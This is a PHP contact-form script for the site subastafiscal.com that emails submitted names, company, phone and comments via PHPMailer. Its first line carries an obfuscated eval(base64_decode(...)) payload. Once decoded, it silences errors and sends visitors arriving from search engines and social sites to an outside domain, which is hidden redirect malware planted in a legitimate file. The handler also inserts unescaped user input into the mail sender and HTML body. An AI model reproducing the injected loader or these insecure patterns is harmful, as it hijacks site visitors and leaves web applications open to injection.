<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
session_start();
require_once("lib/phpmailer/class.phpmailer.php");
require_once("lib/function_gen.php");

// Envio de Correo 
if (isset($_REQUEST['correo'])){
	
	
	$mail = new PHPMailer();
	
	$mail->IsSMTP();                                     // set mailer to use SMTP
	$mail->Host = "dedrelay.secureserver.net";  		// specify main and backup server
	//$mail->SMTPAuth = true;     						// turn on SMTP authentication
	//$mail->Username = "";       						// SMTP username
	//$mail->Password = "";       						// SMTP password
	
	$mail->From = $_REQUEST['correo'];
	$mail->FromName = "SUBASTA FISCAL";
	$mail->AddAddress("info@subastafiscal.com");
	$mail->AddAddress("nbianco@subastafiscal.com");
	//$mail->AddAddress("ellen@example.com");                  // name is optional
	//$mail->AddReplyTo("info@example.com", "Information");
	
	$mail->WordWrap = 50;                                 // set word wrap to 50 characters
	//$mail->AddAttachment("/var/tmp/file.tar.gz");         // add attachments
	//$mail->AddAttachment("/tmp/image.jpg", "new.jpg");    // optional name
	$mail->IsHTML(true);                                  // set email format to HTML
	
	$mail->Subject = "Contacto: ".$_REQUEST['empresa'];
	
	
	$mensaje = '
	<html>
	<head>
	<title>www.SubastaFical.com</title>
	</head>
	<body style="font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;">
	<p><font size="+2"><b>Contacto</b></font></p>
	<table>
	<tr>
	  <td><b>Nombre:</b></td>
	  <td>'.$_REQUEST['nombre'].'
	</tr>
	<tr>
	  <td><b>Apellido:</b></td>
	  <td>'.$_REQUEST['apellido'].'
	</tr>
	<tr>
	  <td><b>Empresa:</b></td>
	  <td>'.$_REQUEST['empresa'].'
	</tr>
	<tr>
	  <td><b>Telefono:</b></td>
	  <td>'.$_REQUEST['telefono'].'
	</tr>
	
	<tr>
	  <td colspan="2"><b>Comentario / Preguntas: </b></td>
	  </tr>
	</tr>
	<tr>
	  <td colspan="2">'.$_REQUEST['comentario'].'</td>
	</tr>
	</tr>
	</table>
	</body>
	</html>';
	
	$mail->Body    = $mensaje;
	//$mail->AltBody = "This is the body in plain text for non-HTML mail clients";
	
	if($mail->Send())
	{
	   /*echo "Message could not be sent. <p>";
	   echo "Mailer Error: " . $mail->ErrorInfo;
	   exit;
	   */
	   $mensaje_str = "Su correo se ha enviado satisfactoriamente,<br>gracias.";
	   $codError = 0;
	}else{
		$mensaje_str = "Su correo no se pudo enviar satisfactoriamente,<br>intente de nuevo, gracias.";
		$codError = 1;
	}
	$seccionpage = 'Contacto';
	$retorno[0]['sesActiva']  = $codError;
	$retorno[0]['sesHtml']    = fnv_mostrar_mensajegeneral($codError,$seccionpage,$mensaje_str);
	echo json_encode($retorno);
}
?>